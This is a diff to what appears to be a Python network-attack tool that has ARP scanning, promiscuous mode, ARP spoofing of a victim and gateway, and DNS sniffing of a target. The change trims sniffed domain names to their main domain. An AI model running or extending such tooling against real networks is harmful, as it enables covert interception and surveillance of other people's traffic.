@@ -556,7 +556,6 @@ def network():
         close_program()
 
 
-
 def net_scan():
     try:
         text_animation(f"\n{Fore.RED}[*] Scanning local network using ARP...{Style.RESET_ALL}", 0.02)
@@ -569,9 +568,14 @@ def net_scan():
     ask_next_action(net_scan, network, "Network")   
 
 
+def get_main_domain(domain):
+    parts = domain.split(".")
+    if len(parts) >= 2:
+        return ".".join(parts[-2:])
+    return domain
+
 def enable_promiscuous(iface):
     os.system(f"sudo ip link set {iface} promisc on")
-
 
 def arp_spoof(victim_ip, gateway_ip, iface):
     conf.iface = iface
@@ -600,8 +604,9 @@ def dns_sniffer(iface, target_ip=""):
         if packet.haslayer(DNSQR) and packet.haslayer(IP):
             if not target_ip or packet[IP].src == target_ip:
                 try:
-                    domain = packet[DNSQR].qname.decode('utf-8')
-                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {domain}{Style.RESET_ALL}")
+                    domain = packet[DNSQR].qname.decode('utf-8').strip('.')
+                    main_domain = get_main_domain(domain)  
+                    print(f"{Fore.GREEN}[+] {packet[IP].src} requested: {main_domain}{Style.RESET_ALL}") 
                 except Exception as e:
                     print(f"{Fore.RED}[-] Error decoding DNS request: {e}{Style.RESET_ALL}")
     sniff(filter=f"udp port 53 and src {target_ip}", iface=iface, prn=process_packet, store=False)
@@ -627,6 +632,7 @@ def web_spoof():
             print(f"\n{Fore.RED}[!] Sniffing stopped.{Style.RESET_ALL}")
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}[!] Interrupted by user.{Style.RESET_ALL}")
+
 
 
 
